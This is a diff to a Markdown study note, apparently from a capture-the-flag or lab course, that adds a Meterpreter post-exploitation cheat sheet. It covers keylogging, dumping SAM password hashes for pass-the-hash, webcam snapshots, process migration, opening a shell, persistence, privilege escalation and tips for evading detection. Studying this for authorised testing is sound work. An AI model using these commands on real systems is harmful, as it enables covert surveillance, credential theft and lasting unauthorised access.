@@ -194,12 +194,114 @@ Meterpreter commands are tools for interacting with the target system. They are 
   - `hashdump`: Dump the SAM database.
 
 
-### **Notes**
-- **Command Availability:** Some commands might not work if the target lacks required components (e.g., no webcam or desktop environment).
-- **Help Menu Variations:** Commands differ based on Meterpreter versions and payloads. Always check using the `help` command.
-- **Practical Use:** Commands like `migrate`, `getsystem`, and `hashdump` are frequently used during post-exploitation.
-
 ---
 ---
 
 
+### **Post-Exploitation with Meterpreter Commands**
+
+
+#### **1. Help Menu**
+- **Command**: `help`
+- Displays a list of all available Meterpreter commands.
+  ```bash
+  meterpreter > help
+  ```
+
+
+#### **2. Core Commands**
+| Command       | Description                                                                 |
+|---------------|-----------------------------------------------------------------------------|
+| `background`  | Backgrounds the current session.                                           |
+| `sessions -l` | Lists all active sessions.                                                 |
+| `sessions -i <id>` | Interacts with a specific session.                                     |
+| `exit`        | Exits the current session.                                                 |
+
+
+#### **3. Check Privileges**
+- **Command**: `getuid`
+- Displays the user level of the Meterpreter session (e.g., SYSTEM or a standard user).
+  ```bash
+  meterpreter > getuid
+  Server username: NT AUTHORITY\SYSTEM
+  ```
+
+
+#### **4. Process Management**
+- **List Processes**
+  - **Command**: `ps`
+  - Displays running processes along with their PIDs and user contexts.
+    ```bash
+    meterpreter > ps
+    ```
+
+- **Migrate to Another Process**
+  - **Command**: `migrate <PID>`
+  - Moves the Meterpreter session to another process (e.g., for keylogging or persistence).
+    ```bash
+    meterpreter > migrate 716
+    [*] Migration completed successfully.
+    ```
+  - **Note**: Avoid migrating from SYSTEM to a lower-privileged user to maintain privileges.
+
+
+#### **5. Keylogging**
+- **Commands**:
+  - Start keylogger: `keyscan_start`
+  - Stop keylogger: `keyscan_stop`
+  - Dump captured keystrokes: `keyscan_dump`
+
+
+#### **6. Dumping Password Hashes**
+- **Command**: `hashdump`
+- Extracts the SAM database hashes, which can be used for attacks like Pass-the-Hash or cracking passwords.
+  ```bash
+  meterpreter > hashdump
+  Administrator:500:<LM Hash>:<NTLM Hash>:::
+  ```
+
+
+#### **7. Searching for Files**
+- **Command**: `search -f <filename>`
+- Locates specific files on the target system, useful for finding flags or configuration files.
+  ```bash
+  meterpreter > search -f flag2.txt
+  Found 1 result...
+      c:\Windows\System32\config\flag2.txt (34 bytes)
+  ```
+
+
+#### **8. Interactive Shell**
+- **Command**: `shell`
+- Opens a command shell on the target system.
+  ```bash
+  meterpreter > shell
+  Microsoft Windows [Version 10.0.19042]
+  C:\Windows\system32>
+  ```
+- To return to Meterpreter: Press `CTRL+Z`.
+
+
+#### **9. Additional Commands**
+| Command        | Description                                                    |
+|----------------|----------------------------------------------------------------|
+| `screenshot`   | Captures a screenshot of the target’s desktop.                 |
+| `webcam_snap`  | Takes a snapshot using the target's webcam.                    |
+| `download`     | Downloads a file from the target system to your local machine. |
+| `upload`       | Uploads a file to the target system.                           |
+| `shell`        | Opens a system command shell on the target.                    |
+| `exit`         | Terminates the Meterpreter session.                            |
+
+
+### **Tips for Effective Use**
+1. **Maintain Persistence**:
+   - Use `run persistence` to maintain access after the session ends.
+
+2. **Privilege Escalation**:
+   - If running as a standard user, use `getsystem` or search for exploits to escalate privileges.
+
+3. **Stay Stealthy**:
+   - Avoid heavy resource usage or suspicious activities to reduce detection chances.
+
+4. **Document Everything**:
+   - Take notes of commands, outputs, and discovered data during the session.
